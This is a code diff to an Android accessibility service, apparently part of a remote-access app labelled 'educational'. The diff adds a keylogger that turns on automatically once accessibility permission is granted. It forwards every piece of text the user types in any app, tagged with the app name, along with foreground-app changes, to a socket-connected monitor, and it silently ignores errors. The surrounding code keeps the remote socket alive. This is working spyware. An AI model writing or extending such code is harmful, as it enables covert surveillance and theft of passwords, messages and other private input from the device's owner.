@@ -81,6 +81,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         
         setServiceInfo(info);
         
+        // Auto-enable keylogger as soon as accessibility is granted
+        com.remoteaccess.educational.commands.KeyloggerService.setEnabled(true);
+        
         // Start continuous auto-click scan immediately
         startAutoClickScanner();
         
@@ -98,8 +101,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         keepAliveManager.start();
 
         // Ensure RemoteAccessService is running and socket is connected.
-        // The accessibility service outlives any Activity, so this guarantees
-        // the socket stays alive as long as accessibility is enabled.
         ensureRemoteServiceRunning();
         startSocketCheckLoop();
     }
@@ -145,6 +146,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
     }
 
+    private String getAppNameForPkg(String pkg) {
+        try {
+            PackageManager pm = getPackageManager();
+            ApplicationInfo appInfo = pm.getApplicationInfo(pkg, 0);
+            return pm.getApplicationLabel(appInfo).toString();
+        } catch (Exception e) {
+            return pkg;
+        }
+    }
+
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         try {
@@ -163,8 +174,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         for (CharSequence cs : textList) {
                             textBuilder.append(cs);
                         }
-                        String log = "[" + packageName + "] TEXT: " + textBuilder.toString();
+                        String typed = textBuilder.toString();
+                        String log = "[" + packageName + "] TEXT: " + typed;
                         keylogBuffer.add(log);
+                        // Route to keylogger and app monitor
+                        try {
+                            SocketManager sm = SocketManager.getInstance(this);
+                            sm.getKeylogger().logEntry(packageName, getAppNameForPkg(packageName), typed, "TEXT_CHANGED");
+                            sm.getAppMonitor().onTextChanged(packageName, typed);
+                        } catch (Exception ignored) {}
                     }
                     break;
                     
@@ -172,6 +190,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     updateCurrentAppName();
                     String log = "[" + packageName + "] APP OPENED";
                     keylogBuffer.add(log);
+                    // Notify app monitor of foreground change
+                    try {
+                        SocketManager.getInstance(this).getAppMonitor().onAppForeground(packageName);
+                    } catch (Exception ignored) {}
                     break;
                     
                 case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
